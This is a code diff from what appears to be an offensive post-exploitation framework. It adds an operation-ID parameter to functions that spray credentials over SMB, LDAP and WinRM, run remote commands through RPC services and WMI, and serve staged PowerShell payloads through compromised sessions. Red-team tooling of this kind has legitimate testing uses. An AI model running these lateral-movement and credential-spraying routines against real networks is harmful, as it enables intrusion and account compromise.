@@ -13,7 +13,7 @@ brightred   = Style.BRIGHT + Fore.RED
 
 
 def winrm(sid, os_type, username, password, stage_ip, domain=None, dc_host=None, dc_ip=None, local_auth=False, target_ip=None, command=None, debug=None,
-    exec_url=None, script_path=None, stager=False, stage_port=8000):
+    exec_url=None, script_path=None, stager=False, stage_port=8000, op_id="console"):
     """
     winrm -u <username> -p <password> [-d <domain>] [-dc <dc_host>] [--dc-ip <dc_ip>] [--local-auth] -i <target_ip>
     Establish a WinRM session to the target host using the specified credentials.
@@ -32,10 +32,10 @@ def winrm(sid, os_type, username, password, stage_ip, domain=None, dc_host=None,
     if local_auth:
         hostname_cmd = "hostname"
         if transport in ("tcp", "tls"):
-            hostname = shell.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True)
+            hostname = shell.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
         elif transport in ("http", "https"):
-            hostname = shell.run_command_http(sid, hostname_cmd)
+            hostname = shell.run_command_http(sid, hostname_cmd, op_id=op_id)
 
         if hostname:
             print(brightyellow + f"[*] Authenticating to {target_ip} as {hostname}\\{username}...")
@@ -141,20 +141,20 @@ Invoke-Command -ComputerName $nb -Credential $cred -ScriptBlock {{ {cmd} }}
         stage.start_stager_server(stage_port, ps_cmd)
 
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, ps)
+            out = shell.run_command_http(sid, ps, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, ps, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, ps, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown session transport!"
 
     else:
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, ps_cmd)
+            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
     
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, ps_cmd, timeout=2, timeoutprint=False, portscan_active=True)
+            out = shell.run_command_tcp(sid, ps_cmd, timeout=2, timeoutprint=False, portscan_active=True, op_id=op_id)
 
         else:
             print(brightred + f"[!] Unsupported session transport!")
@@ -174,7 +174,7 @@ Invoke-Command -ComputerName $nb -Credential $cred -ScriptBlock {{ {cmd} }}
     return out or ""
 
 
-def netexec_smb(sid, userfile, passfile, domain, targets, stage_ip, shares=False, stager=False, stage_port=8000):
+def netexec_smb(sid, userfile, passfile, domain, targets, stage_ip, shares=False, stager=False, stage_port=8000, op_id="console"):
     if shares:
         # forbid files
         try:
@@ -227,10 +227,10 @@ def netexec_smb(sid, userfile, passfile, domain, targets, stage_ip, shares=False
         hostname_cmd = "hostname"
 
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, hostname_cmd)
+            out = shell.run_command_http(sid, hostname_cmd, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, hostname_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
         if out:
             domain = out
@@ -436,20 +436,20 @@ foreach ($T in $Targets) {{
         stage.start_stager_server(stage_port, ps)
 
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, ps_cmd)
+            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown session transport!"
 
     else:
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, one_liner)
+            out = shell.run_command_http(sid, one_liner, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
     
         else:
             print(brightred + f"[!] Unknown transport for session")
@@ -470,7 +470,7 @@ foreach ($T in $Targets) {{
         print(brightred + f"[!] No valid credentials found")
         return None
 
-def netexec_ldap(sid, userfile, passfile, domain, dc, stage_ip, ldaps=False, port=False, debug=False, stager=False, stage_port=8000):
+def netexec_ldap(sid, userfile, passfile, domain, dc, stage_ip, ldaps=False, port=False, debug=False, stager=False, stage_port=8000, op_id="console"):
 
     if os.path.isfile(userfile):
         with open(userfile, 'r') as f:
@@ -634,20 +634,20 @@ foreach ($U in $Users) {{
         stage.start_stager_server(stage_port, ps)
 
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, ps_cmd)
+            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown session transport!"
 
     else:
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, one_liner)
+            out = shell.run_command_http(sid, one_liner, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
         else:
             return brightred + "[!] Unsupported transport"
 
@@ -668,8 +668,8 @@ foreach ($U in $Users) {{
         return out
 
 
-def netexec_winrm(sid, userfile, passfile, domain, targets, stage_ip, port=False, use_https=False, sleep_seconds=0, sleep_minutes=0, debug=False, stager=False, stage_port=8000):
-    import os, base64
+def netexec_winrm(sid, userfile, passfile, domain, targets, stage_ip, port=False, use_https=False, sleep_seconds=0, sleep_minutes=0,
+    debug=False, stager=False, stage_port=8000, op_id="console"):
 
     # 1) load users
     if os.path.isfile(userfile):
@@ -795,20 +795,20 @@ foreach ($T in $Targets) {{
         stage.start_stager_server(stage_port, ps)
 
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, ps_cmd)
+            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown session transport!"
 
     else:
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, one_liner)
+            out = shell.run_command_http(sid, one_liner, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown transport detected!"
@@ -833,7 +833,8 @@ foreach ($T in $Targets) {{
         else:
             return brightred + "[!] No valid WinRM creds found"
 
-def rpcexec(sid, userfile, passfile, domain, targets, command, stage_ip, svcname="GunnerSvc", cleanup=False, debug=False, stager=False, stage_port=8000):
+def rpcexec(sid, userfile, passfile, domain, targets, command, stage_ip, svcname="GunnerSvc", cleanup=False,
+    debug=False, stager=False, stage_port=8000, op_id="console"):
 
     # 1) load users
     if os.path.isfile(userfile):
@@ -932,20 +933,20 @@ Write-Output "THE BUMBACLUT IN THE BASKET"
         stage.start_stager_server(stage_port, ps)
 
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, ps_cmd)
+            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown session transport!"
 
     else:
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, one_liner)
+            out = shell.run_command_http(sid, one_liner, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown transport detected!"
@@ -959,7 +960,8 @@ Write-Output "THE BUMBACLUT IN THE BASKET"
     else:
         return brightred + "[!] No output from RPCEXEC attempt"
 
-def wmiexec(sid, username, password, domain, target, command, stage_ip, debug=False, stager=False, stage_port=8000):
+def wmiexec(sid, username, password, domain, target, command, stage_ip,
+    debug=False, stager=False, stage_port=8000, op_id="console"):
     ps = f"""
 $T = '{target}'
 try {{
@@ -1008,20 +1010,20 @@ Write-Output ("WMIEXEC    {{0,-7}} Return={{1}}" -f $result.ProcessId, $result.R
         stage.start_stager_server(stage_port, ps)
 
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, ps_cmd)
+            out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown session transport!"
 
     else:
         if transport in ("http", "https"):
-            out = shell.run_command_http(sid, one_liner)
+            out = shell.run_command_http(sid, one_liner, op_id=op_id)
 
         elif transport in ("tcp", "tls"):
-            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True)
+            out = shell.run_command_tcp(sid, one_liner, timeout=0.5, portscan_active=True, op_id=op_id)
 
         else:
             return brightred + "[!] Unknown session transport!"
